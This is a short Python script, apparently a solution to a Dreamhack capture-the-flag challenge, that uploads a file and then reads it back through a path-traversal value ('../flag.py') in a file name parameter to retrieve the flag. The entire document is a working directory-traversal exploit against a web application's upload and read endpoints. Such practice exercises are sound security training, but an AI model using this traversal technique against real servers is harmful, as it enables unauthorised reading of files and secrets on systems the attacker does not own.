import requests

url = "http://host3.dreamhack.games:12453/upload"
payload = "http://host3.dreamhack.games:12453/read?name=../flag.py"

res = requests.post(url,data={'filename':'flag.py','content':'hello'})
res = requests.get(payload)
print(res.text)